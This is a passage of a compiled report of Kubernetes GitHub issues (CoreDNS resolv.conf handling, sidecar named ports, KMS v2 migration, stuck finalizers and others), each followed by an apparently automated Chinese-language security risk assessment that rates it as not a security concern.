        # Additional enabled plugins
        enabled:
          - name: CustomScheduler
        disabled:
          - name: "*"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.30.2+k3s1
```

</details>


#### Cloud provider

<details>
I am using k3s.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户在尝试通过自定义Kubernetes调度器插件来模拟Pod处于不可调度状态。Issue中涉及的代码和配置主要是关于自定义插件的实现和使用，并未涉及任何潜在的安全风险。根据风险判断标准，尤其是标准6，如果Issue不涉及安全问题，则风险评级判断为不涉及。因此，该Issue不涉及安全风险。

---

## Issue #127991 CoreDNS not filter incorrect settings in /etc/resolv.conf

- Issue 链接：[#127991](https://github.com/kubernetes/kubernetes/issues/127991)

### Issue 内容

#### What happened?

Recently , eanbled dns cache on host itself where update /etc/resolv.conf files as below :
search xxx.yyy.com  zzz.com
nameserver 127.0.0.1
nameserver A.A.A.A 
nameserver B.B.B.B
options ends0 timeout:3 

Once core dns pod running it will copy records from host . And nameserver 127.0.0.1 copied as first nameserver where trigger issue happen. Other pods who query dns from core dns pod will stuck and not get correct ip from dns name. I tested on pure docker env as well. it can auto filter not correct setting in /etc/resolv.conf other than just copy it all. Docker can ignore nameserver 127.0.0.1 or nameserver 0.0.0.0 setting there. 

#### What did you expect to happen?

Read content and filter not correct settings in /etc/resolv.conf just as mechanism of docker  

#### How can we reproduce it (as minimally and precisely as possible)?

Just enable copy above /etc/resolv.conf and re-deployment core-dns 

#### Anything else we need to know?

_No response_

#### Kubernetes version


kubernetes version: v1.24.10



#### Cloud provider

<details>
not sure what should input here
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Oracle Linux Server"
VERSION="8.10"
ID="ol"
ID_LIKE="fedora"
VARIANT="Server"
VARIANT_ID="server"
VERSION_ID="8.10"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Oracle Linux Server 8.10"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:oracle:linux:8:10:server"
HOME_URL="https://linux.oracle.com/"
BUG_REPORT_URL="https://github.com/oracle/oracle-linux"

ORACLE_BUGZILLA_PRODUCT="Oracle Linux 8"
ORACLE_BUGZILLA_PRODUCT_VERSION=8.10
ORACLE_SUPPORT_PRODUCT="Oracle Linux"
ORACLE_SUPPORT_PRODUCT_VERSION=8.10
$ uname -a
Linux  5.4.17-2136.333.5.el8uek.x86_64 #3 SMP Thu Jun 20 01:03:41 PDT 2024 x86_64 x86_64 x86_64 GNU/Linux




```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了CoreDNS在读取主机的/etc/resolv.conf文件时，没有过滤不正确的配置（如nameserver 127.0.0.1），导致其他Pod在查询DNS时无法正确解析。根据风险判断标准，该问题属于配置不当导致的功能性错误，不涉及安全风险。因为攻击者无法利用此问题进行攻击，也无法导致系统存在可被分配CVE编号的漏洞。综上所述，风险评级为不涉及。

---

## Issue #127990 `system:monitoring` lacks access to kubelet /metrics endpoint

- Issue 链接：[#127990](https://github.com/kubernetes/kubernetes/issues/127990)

### Issue 内容

#### What happened?

Discussion began in https://github.com/kubernetes/enhancements/pull/4830#discussion_r1794149005 where it was identified that [`system:monitoring` cluster role](https://github.com/kubernetes/kubernetes/blob/release-1.31/staging/src/k8s.io/apiserver/pkg/authentication/user/user.go#L73) does not allow access to kubelet's /metrics and /metrics/slis endpoint

#### What did you expect to happen?

Would have expected the test described [here](https://github.com/kubernetes/enhancements/pull/4830#discussion_r1794426008) to pass

#### How can we reproduce it (as minimally and precisely as possible)?

Summarized [here](https://github.com/kubernetes/enhancements/pull/4830#discussion_r1794426008)

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# v1.31.0
```

</details>


#### Cloud provider

<details>
GCP
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论了`system:monitoring`集群角色无法访问kubelet的/metrics和/metrics/slis端点的问题，这是一个关于权限配置的功能性问题。Issue提交者希望调整权限以允许该角色访问kubelet的指标数据，这有助于监控和管理集群的性能。这种权限不足的问题不会导致安全风险，也不存在被攻击者利用的漏洞。因此，根据风险判断标准，该Issue不涉及安全风险。

---

## Issue #127977 namespace not exists, but can get the cr resource in this namespace

- Issue 链接：[#127977](https://github.com/kubernetes/kubernetes/issues/127977)

### Issue 内容

#### What happened?

namespace not exists, but can get the cr resource
```
k get mysqlbackup -A
NAMESPACE   NAME                  AGE
m1          backup-ms-3-1229      285d
m1          ddddddddddd           285d
m1          master-slave-1-1229   285d
```
ns m1 no exists

```
 k get ns|grep m1
```

get backup-ms-3-1229 in m1
```
k get  mysqlbackup backup-ms-3-1229 -n m1
NAME               AGE
backup-ms-3-1229   285d
```




#### What did you expect to happen?

if ns no exists, the cr resource should not get

#### How can we reproduce it (as minimally and precisely as possible)?

this resource created long time ago

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.10", GitCommit:"b8609d4dd75c5d6fba4a5eaa63a5507cb39a6e99", GitTreeState:"clean", BuildDate:"2023-10-18T11:44:31Z", GoVersion:"go1.20.10", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.10", GitCommit:"b8609d4dd75c5d6fba4a5eaa63a5507cb39a6e99", GitTreeState:"clean", BuildDate:"2023-10-18T11:33:36Z", GoVersion:"go1.20.10", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux master01 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Client: Docker Engine - Community
 Version:           20.10.21
 API version:       1.41
 Go version:        go1.18.7
 Git commit:        baeda1f
 Built:             Tue Oct 25 18:01:58 2022
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true

Server: Docker Engine - Community
 Engine:
  Version:          20.10.21
  API version:      1.41 (minimum version 1.12)
  Go version:       go1.18.7
  Git commit:       3056208
  Built:            Tue Oct 25 17:59:49 2022
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.9
  GitCommit:        1c90a442489720eec95342e1789ee8a5e1b9536f
 runc:
  Version:          1.1.4
  GitCommit:        v1.1.4-0-g5fd4c4d
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CNI: kube-flannel
CSI: 
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在Kubernetes集群中，一个不存在的命名空间（m1）下仍然可以获取到自定义资源（Custom Resource，mysqlbackup）。这可能是由于资源未正确清理导致的系统不一致问题，或者是API服务器缓存导致的数据残留。但此问题未涉及任何安全风险。根据风险判断标准：

1. 该风险能被攻击者利用吗？此问题是系统管理和资源清理问题，攻击者无法利用。
2. 该风险有可能成为漏洞并被分配CVE编号且CVSS评分在high以上吗？不可能，此问题不会导致权限提升、命令执行等高风险漏洞。
3. Issue提交者在提交内容中暴露的敏感信息、不当操作、不当配置等问题，不属于安全风险。

因此，风险评级判断为“不涉及”。

---

## Issue #127958 Named ports specified in sidecar container pod spec are not available to services

- Issue 链接：[#127958](https://github.com/kubernetes/kubernetes/issues/127958)

### Issue 内容

#### What happened?

When migrating a sidecar container to a native sidecar container (initContainer with restartPolicy=Always), traffic going via the Kubernetes Service did not reach the application container/sidecar container.

#### What did you expect to happen?

The traffic should have reached the sidecar container like before the migration.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a Pod with a native sidecar container (initContainer) with a named port, as well as a Kubernetes Service using that named port as its targetPort. This port is not listed in the Endpoint.

Apply the following:

```
apiVersion: v1
kind: Pod
metadata:
  name: sidecar-ports
  labels:
    app: sidecar-ports
spec:
  containers:
  - image: bloomberg/goldpinger:3.10.1
    name: goldpinger
    ports:
    - containerPort: 8000
      name: http
      protocol: TCP
  initContainers:
  # note: no envoy configuration is provided, the steps to reproduce involve reading other Kubernetes manifests (Endpoints)
  - image: envoyproxy/envoy:v1.73.7
    name: tls-terminator
    ports:
    - containerPort: 9443
      name: https
      protocol: TCP
---
apiVersion: v1
kind: Service
metadata:
  name: sidecar-ports
spec:
  ports:
  - name: http
    port: 80
    protocol: TCP
    targetPort: http
  - name: https
    port: 443
    protocol: TCP
    targetPort: https
  selector:
    app: sidecar-ports
  type: ClusterIP
```

The Endpoint backing the created Service "sidecar-ports" should contain two ports; "http" and "https", but it only contains "http":
```
k describe endpoints sidecar-ports
Name:         sidecar-ports
Namespace:    default
Subsets:
  Ports:
    Name  Port  Protocol
    ----  ----  --------
    http  8000  TCP

Events:  <none>
```

#### Anything else we need to know?

The feature gate is enabled:

```
kubectl get --raw /metrics | grep kubernetes_feature_enabled | grep SidecarContainers
kubernetes_feature_enabled{name="SidecarContainers",stage="BETA"} 1
```

I was suggested to create this issue in [this Slack thread](https://kubernetes.slack.com/archives/C06JCTLFPFX/p1728475764781559)

Workarounds:

1) 

If we update the Service to contain numeric ports instead of named ports, they show up in the endpoint:
```diff
k diff -f reproduce.yaml
diff -u -N /tmp/LIVE-529307225/v1.Service.default.sidecar-ports /tmp/MERGED-1321372933/v1.Service.default.sidecar-ports
--- /tmp/LIVE-529307225/v1.Service.default.sidecar-ports 2024-10-09 14:40:30.518739432 +0200
+++ /tmp/MERGED-1321372933/v1.Service.default.sidecar-ports      2024-10-09 14:40:30.518739432 +0200
@@ -25,7 +25,7 @@
   - name: https
     port: 443
     protocol: TCP
-    targetPort: https
+    targetPort: 9443
   selector:
     app: sidecar-ports
   sessionAffinity: None
```

```
Name:         sidecar-ports
Namespace:    default
Subsets:
  Ports:
    Name   Port  Protocol
    ----   ----  --------
    https  9443  TCP
    http   8000  TCP

Events:  <none>
```

2)

If we specify the named port in the "main" container instead of in the initContainer, the port shows up in the endpoint:

```diff
spec:
  containers:
  - image: bloomberg/goldpinger:3.10.1
    name: goldpinger
    ports:
    - containerPort: 8000
      name: http
      protocol: TCP
+    - containerPort: 9443
+      name: https
+      protocol: TCP
  initContainers:
  # note: no envoy configuration is provided, the steps to reproduce involve reading other Kubernetes manifests (Endpoints)
  - image: envoyproxy/envoy:v1.73.7
    name: tls-terminator
-    ports:
-    - containerPort: 9443
-      name: https
-      protocol: TCP
```

```
Name:         sidecar-ports
Namespace:    default
Subsets:
  Ports:
    Name   Port  Protocol
    ----   ----  --------
    https  9443  TCP
    http   8000  TCP

Events:  <none>
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.9
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.8
```

</details>


#### Cloud provider

<details>
Self-hosted, kubeadm-driven.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
I'll say Ubuntu.
$ uname -a
I can provide this if strictly relevant.

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```
$ containerd --version
containerd containerd.io 1.7.20 8fc6bcff51318944179630522a095cc9dbf9f353
```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
在分析该Issue时，可以看到用户在使用Kubernetes的原生sidecar容器（作为initContainer，设置`restartPolicy=Always`）时，发现定义在sidecar容器中的命名端口无法通过Service访问。这导致流量无法到达应用程序容器或sidecar容器。

这个问题是关于Kubernetes中命名端口在特定配置下未正确暴露给Service的功能性问题。

根据风险判断标准：

1. **该风险不能被攻击者利用**。这个问题是由于配置导致的服务不可用，并不涉及攻击者可以利用的安全漏洞。

2. **该问题不会成为一个漏洞**，也不会被分配CVE编号，按照CVSS 3.1评分标准，不涉及安全风险。

3. **Issue提交者在提交内容中并未暴露敏感信息、不当操作或不当配置**，因此不属于安全风险。

6. **该Issue不涉及安全问题**，因此风险评级判断为“不涉及”。

---

## Issue #127957 pyroscope-server always restarts and cannot be started successfully

- Issue 链接：[#127957](https://github.com/kubernetes/kubernetes/issues/127957)

### Issue 内容

#### What happened?

pyroscope-server always restarts and cannot be started successfully, reporting probe 503 error, version is 1.4.0,There was no operation, it just happened suddenly, I don't know why

#### What did you expect to happen?

Started successfully and no longer restarted frequently

#### How can we reproduce it (as minimally and precisely as possible)?

The error log information is as follows：
![image](https://github.com/user-attachments/assets/bc17667b-417a-40a4-bf25-75249a9b6621)

the version is pyroscope:1.4.0

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了pyroscope-server无法启动，总是重启并报告probe 503错误，没有提供更多细节。从提供的信息来看，这似乎是一个应用程序自身的问题，可能由于配置错误或程序bug导致的故障，并没有涉及安全风险。根据风险判断标准，Issue不涉及安全问题，风险评级判断为不涉及。

---

## Issue #127950 Unable to migrate to kms v2

- Issue 链接：[#127950](https://github.com/kubernetes/kubernetes/issues/127950)

### Issue 内容

#### What happened?

We tried to migrate kms plugin from v1 to v2 as kms v1 is deprecated with Micork8s version v1.26 onwards.
During the migration, we were unable to create secrets using kms plugin and we are getting below errors:
```
failed to create: Internal error occurred: got unexpected nil transformer
```


#### What did you expect to happen?

The secrets should be created successfully

#### How can we reproduce it (as minimally and precisely as possible)?

1. Upgrade the kubernetes to v1.30.3
2. Migrate the KMS plugin to v2
3. Create a new secret with command:
```
kubectl create secret generic kmssecret -n default --from-literal=mykey="This a test data to encrypt"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
Microk8s On-Premise
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux kms-test 6.6.16generic #1 SMP PREEMPT_DYNAMIC Sat Jun  8 12:36:32 UTC 2024 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
Microk8s
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在将KMS插件从v1迁移到v2后，创建Secret时遇到了错误：`failed to create: Internal error occurred: got unexpected nil transformer`。这导致无法创建Secret，影响了正常使用。

根据提供的信息，这是在升级Kubernetes版本和迁移KMS插件时出现的兼容性或配置问题。没有迹象表明此问题会导致安全漏洞被攻击者利用，也没有涉及敏感信息泄露或权限提升等安全风险。

根据风险判断标准，此Issue不涉及安全问题，风险评级判断为不涉及。

---

## Issue #127938 bug: No 'time' added when server-side-applying the same yaml as a 2nd field manager

- Issue 链接：[#127938](https://github.com/kubernetes/kubernetes/issues/127938)

### Issue 内容

#### What happened?

We have a use case where two field managers co-own some of `.metadata.managedFields`. It is observed that the 'time' is missing after the 2nd field manager server-side-applied its configuration, when that applied configuration is the same with that of the 1st field manager.

An example of `.metadata.managedFields` which demonstrates what is missing:
```
- apiVersion: apps/v1
  fieldsType: FieldsV1
  fieldsV1:
    f:metadata:
      f:labels:
        f:app: {}
    f:spec:
      f:progressDeadlineSeconds: {}
      f:replicas: {}
      f:revisionHistoryLimit: {}
      f:selector: {}
      f:strategy:
        f:rollingUpdate:
          f:maxSurge: {}
          f:maxUnavailable: {}
        f:type: {}
      f:template:
        f:metadata:
          f:creationTimestamp: {}
          f:labels:
            f:app: {}
        f:spec:
          f:containers:
            k:{"name":"nginx"}:
              .: {}
              f:image: {}
              f:imagePullPolicy: {}
              f:name: {}
              f:resources: {}
              f:terminationMessagePath: {}
              f:terminationMessagePolicy: {}
          f:dnsPolicy: {}
          f:restartPolicy: {}
          f:schedulerName: {}
          f:securityContext: {}
          f:terminationGracePeriodSeconds: {}
  manager: jun-apply-again
  operation: Apply
- apiVersion: apps/v1
  fieldsType: FieldsV1
  fieldsV1:
    f:metadata:
      f:labels:
        f:app: {}
    f:spec:
      f:progressDeadlineSeconds: {}
      f:replicas: {}
      f:revisionHistoryLimit: {}
      f:selector: {}
      f:strategy:
        f:rollingUpdate:
          f:maxSurge: {}
          f:maxUnavailable: {}
        f:type: {}
      f:template:
        f:metadata:
          f:creationTimestamp: {}
          f:labels:
            f:app: {}
        f:spec:
          f:containers:
            k:{"name":"nginx"}:
              .: {}
              f:image: {}
              f:imagePullPolicy: {}
              f:name: {}
              f:resources: {}
              f:terminationMessagePath: {}
              f:terminationMessagePolicy: {}
          f:dnsPolicy: {}
          f:restartPolicy: {}
          f:schedulerName: {}
          f:securityContext: {}
          f:terminationGracePeriodSeconds: {}
  manager: jun
  operation: Apply
  time: "2024-10-01T21:53:28Z"
```
Field manager 'jun' has `"2024-10-01T21:53:28Z"` as the applied 'time', but field manager 'jun-apply-again' doesn't have any 'time'.

#### What did you expect to happen?

Each item in the list of managed fields should consistently have a 'time' associated.

#### How can we reproduce it (as minimally and precisely as possible)?

To help reproduce the bug, I documented the exact command lines and needed manifests [here](https://github.com/waltforme/random/blob/main/kubernetes-managedfields/apply_HTTP-PATCH.md).

For a little broader background, one can optionally read this [README.md](https://github.com/waltforme/random/blob/main/kubernetes-managedfields/README.md).

#### Anything else we need to know?

_No response_

#### Kubernetes version

I built the kube-apiserver from 7ee17ce9b7c2a22e63e2bbd79d48d3fe349a9386.
<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.1", GitCommit:"8f94681cd294aa8cfd3407b8191f6c70214973a4", GitTreeState:"clean", BuildDate:"2023-01-18T15:58:16Z", GoVersion:"go1.19.5", Compiler:"gc", Platform:"linux/arm64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"32", GitVersion:"v0.0.0-master+$Format:%H$", GitCommit:"$Format:%H$", GitTreeState:"", BuildDate:"1970-01-01T00:00:00Z", GoVersion:"go1.23.0", Compiler:"gc", Platform:"linux/arm64"}
error: could not parse pre-release/metadata (-master+$Format:%H$) in version "v0.0.0-master+$Format:%H$"
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
此Issue报告了在使用Kubernetes的server-side apply功能时，当第二个field manager应用与第一个field manager相同的YAML配置时，`.metadata.managedFields`中缺少了`time`字段。这是一个与资源管理元数据更新相关的功能性问题。根据提供的信息，缺少`time`字段不会导致任何安全漏洞，攻击者无法利用此问题进行未经授权的操作、权限提升或攻击其他用户的数据。此外，该问题不涉及敏感信息泄露，也不会导致拒绝服务攻击。综上所述，根据风险评估标准，该Issue不涉及安全风险。

---

## Issue #127937 TCP connection timeout after sometime when using externaltrafficpolicy:local and metalb controller.

- Issue 链接：[#127937](https://github.com/kubernetes/kubernetes/issues/127937)

### Issue 内容

#### What happened?

I have deployed a microservice(single instance) on a 3 node cluster, each node as a master/worker. 
Application is up and running, have a svc with loadbalancer(External IP). 

when deploying freshly, all traffic on the external loadbalancer IP is running fine, but after sometime I could see traffic is stopped, tcp connection timeout on the loadbalancer ip: port.

After debugging, I could see, when setup is fresh, all nodes have iptables related to health check and the node which has instance running has some iptables to support trafficpolicy I guess.

but later on, if i do rolling update or instance get deleted and move to other node, could see the drop iptables on the nodes where the instance is not scheduled. 

1) How this drop iptables rules came?
2) externaltrafficpolicy: local, then traffic should reach to the node where instance is running, but packet is getting dropped hence it is reaching to the other node when iptable rules are dropped. so why the traffic is reaching to the node with no instance? 


node-1:~ # iptables -L | grep 192.168.64.128
DROP       tcp  --  anywhere             192.168.64.128       /* services/controller-3:x has no local endpoints */ tcp dpt:gsmp-x

node-0:~ # iptables -L | grep 192.168.64.128
DROP       tcp  --  anywhere             192.168.64.128       /* services/controller-3:x has no local endpoints */ tcp dpt:gsmp-x

node-2:~ # iptables -L | grep 192.168.64.128
(no rule)


Error:
{"level":"error","timestamp":1728416020520.091,"caller":"ancp.git@v1.4.0-33309983/client.go:66","short_message":"connection failed: dial tcp 192.168.64.128:6068: connect: connection timed out","logging_lib_version":"2.0.0","time_zone":"UTC(+0s)","a4_pod_name":"4901708dc8f4","log_type":"APPLICATION"}
2024/10/08 19:33:40 failed to create client for 192.168.64.128: dial tcp 192.168.64.128:6068: connect:

svc:
services      controller-3                                 LoadBalancer   192.168.255.74    192.168.64.128   6068:30655/TCP                                                                  10d

#### What did you expect to happen?

traffic should flow seamlessely.

#### How can we reproduce it (as minimally and precisely as possible)?

 deploy pod on node-3.
restart the pod, it got deployed to node-2.
and you will see the issue.

(sometimes we may need to do multiple rolling update)

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.7", GitCommit:"84e1fc493a47446df2e155e70fca768d2653a398", GitTreeState:"clean", BuildDate:"2023-07-19T12:23:27Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.7", GitCommit:"84e1fc493a47446df2e155e70fca768d2653a398", GitTreeState:"clean", BuildDate:"2023-07-19T12:16:45Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
flannel/calico
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过对Issue内容的分析，发现这是一个关于Kubernetes服务在使用`externalTrafficPolicy: Local`和MetalLB控制器时出现TCP连接超时的问题。用户描述了在滚动更新或实例迁移到其他节点后，流量出现中断，且在未运行实例的节点上出现了iptables DROP规则。

这一问题涉及到服务的网络配置、iptables规则和流量路由，但并未涉及到任何潜在的安全风险。根据风险判断标准，未发现此Issue存在可被攻击者利用的漏洞，也不会导致命令执行、提权等高风险安全问题。因此，风险评级判断为**不涉及**。

---

## Issue #127917 Job tracking Finalizers batch.kubernetes.io/job-tracking prevent the pod from being deleted. The pod is stuck in terminating status

- Issue 链接：[#127917](https://github.com/kubernetes/kubernetes/issues/127917)

### Issue 内容

#### What happened?

Pod related to a job is stuck in terminating status and unable to delete it. Even tried removing the job associated with the pod, but it's not getting deleted. When trying to remove the finalizer in the pod using a command.

`kubectl patch pod <pod-name> -n <namepsace> -p '{"metadata":{"finalizers":null}}'`
 
 getting following error 
 
`The Pod is invalid: metadata: Invalid value: "Burstable": Pod QoS is immutable`


#### What did you expect to happen?

The pod should be deleted

#### How can we reproduce it (as minimally and precisely as possible)?

Currently don't have a way to reproduce it

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.29

#### Cloud provider

Azure AKS

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中，Job关联的Pod由于存在finalizer导致无法被删除，尝试删除Pod的finalizer时遇到错误`The Pod is invalid: metadata: Invalid value: "Burstable": Pod QoS is immutable`。这是一个关于Kubernetes资源管理和操作的问题，属于运维层面的困难，并没有提及任何安全漏洞。

根据风险判断标准，此Issue没有涉及可被攻击者利用的安全风险，也不存在可能被分配CVE编号的漏洞。Issue中没有涉及命令执行、容器逃逸、提权等高安全风险的问题。因此，风险评级判断为不涉及安全风险。

---

## Issue #127914 Add Opaque as default type in kubectl create secret .

- Issue 链接：[#127914](https://github.com/kubernetes/kubernetes/issues/127914)

### Issue 内容

#### What happened?

Reference : https://github.com/kubernetes/kubernetes/pull/120337/files#r1408525014
Opaque is not added as default type in code as we see empty string when stating type in help message.
```shell
Options:
...
    --type='':
	The type of secret to create
...
```

#### What did you expect to happen?

Options:
```shell
...
    --type='Opaque':
	The type of secret to create
...
```

#### How can we reproduce it (as minimally and precisely as possible)?

```shell
kubectl create secret generic --help
```

#### Anything else we need to know?

NONE

#### Kubernetes version

<details>

```console
$ kubectl version
```

</details>


#### Cloud provider

<details>
any
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
这个Issue报告的是`kubectl create secret`命令的帮助信息中，`--type`选项的默认值显示为空字符串`''`，而不是`'Opaque'`。Issue提出应该将默认值显示为`'Opaque'`，以反映实际的默认行为。

在Kubernetes中，当创建一个Secret且未指定`--type`时，默认类型确实是`'Opaque'`。这个问题只是帮助信息的显示不够明确，可能会导致用户困惑。但这并不涉及任何安全风险，因为它不会被攻击者利用，也不会导致任何形式的漏洞。

---

## Issue #127911 Documentation for structured authorization is invalid

- Issue 链接：[#127911](https://github.com/kubernetes/kubernetes/issues/127911)

### Issue 内容

#### What happened?

Using the example from https://kubernetes.io/docs/reference/access-authn-authz/authorization/#authz-config-example results in errors.
* It states that KubeConfig is a valid value, in fact it is KubeConfigFile.
* The CEL selector is also invalid, it results in another error.


When using that example, verbatim, in 1.30 and 1.31 I receive the following when the kube api server attempts to start

```
2024-10-07T23:26:25.950858192Z stderr F I1007 23:26:25.950777       1 options.go:228] external host was not specified, using 10.3.0.20
2024-10-07T23:26:25.952643399Z stderr F E1007 23:26:25.952583       1 run.go:72] "command failed" err=<
2024-10-07T23:26:25.952647031Z stderr F         [authorizers[0].connectionInfo.type: Unsupported value: apiserver.WebhookConnectionInfo{Type:"KubeConfig", KubeConfigFile:(*string)(0xc000258560)}: supported values: "InClusterConfig", "KubeConfigFile", authorizers[0].matchConditions[2].expression: Invalid value: "in request.user.groups)": compilation failed: ERROR: <input>:1:1: Syntax error: extraneous input 'in' expecting {'[', '{', '(', '.', '-', '!', 'true', 'false', 'null', NUM_FLOAT, NUM_INT, NUM_UINT, STRING, BYTES, IDENTIFIER}
2024-10-07T23:26:25.952648765Z stderr F          | in request.user.groups)
2024-10-07T23:26:25.952649804Z stderr F          | ^
2024-10-07T23:26:25.952650969Z stderr F         ERROR: <input>:1:23: Syntax error: extraneous input ')' expecting <EOF>
2024-10-07T23:26:25.952651994Z stderr F          | in request.user.groups)
2024-10-07T23:26:25.952653008Z stderr F          | ......................^]
2024-10-07T23:26:25.952654039Z stderr F  >
```

#### What did you expect to happen?

The config type comment and example to correctly state `KubeConfigFile` instead of `KubeConfig`
The CEL selector to not error out.

#### How can we reproduce it (as minimally and precisely as possible)?

